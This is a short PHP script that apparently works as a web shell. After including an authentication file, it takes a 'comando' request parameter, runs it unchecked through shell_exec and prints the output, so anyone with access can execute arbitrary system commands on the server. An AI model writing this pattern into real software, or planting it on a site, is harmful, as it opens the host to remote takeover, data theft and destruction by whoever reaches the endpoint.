<?php 
require_once("autenticacao.php");
$comando = $_REQUEST["comando"];
$servico = shell_exec($comando);

echo $servico;

?>